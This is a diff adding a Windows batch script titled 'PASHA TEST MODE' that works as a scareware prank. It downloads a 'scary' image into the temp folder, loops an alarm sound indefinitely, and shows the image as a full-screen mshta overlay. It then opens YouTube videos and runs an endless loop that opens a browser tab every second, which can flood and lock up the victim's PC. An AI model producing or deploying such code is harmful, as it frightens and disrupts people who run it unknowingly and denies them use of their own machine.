@@ -1,0 +1,24 @@
+@echo off
+title PASHA TEST MODE
+
+echo [1] Downloading scary image to your PC...
+powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ExcluseDev/scotty-sim/main/scaryback.png' -OutFile \"$env:TEMP\scary.png\""
+
+echo [2] Starting loud banging noise...
+start /b powershell -c "while($true) { (New-Object Media.SoundPlayer 'C:\Windows\Media\Alarm01.wav').PlaySync() }"
+
+echo [3] Opening scary image overlay...
+:: We load the local temp file instead of the web link
+start /b mshta "javascript:var s='<html><body style=background-color:black;margin:0;overflow:hidden;><img src=file:///%temp%\scary.png style=width:100vw;height:100vh;object-fit:cover;filter:brightness(0.5) contrast(2);></body></html>';document.write(s);window.moveTo(0,0);window.resizeTo(screen.width,screen.height);"
+
+echo [4] Opening videos...
+start "" "https://www.youtube.com/watch?v=UMWyh0VilWk"
+start "" "https://www.youtube.com/watch?v=BIaMFvNbShE&t=1s"
+
+echo [5] Starting browser spam loop...
+:spam
+:: We use start "" to just open the default browser, in case you don't have Chrome/Firefox
+start "" "https://www.youtube.com/watch?v=BIaMFvNbShE&t=1s"
+
+timeout /t 1 /nobreak >nul
+goto spam
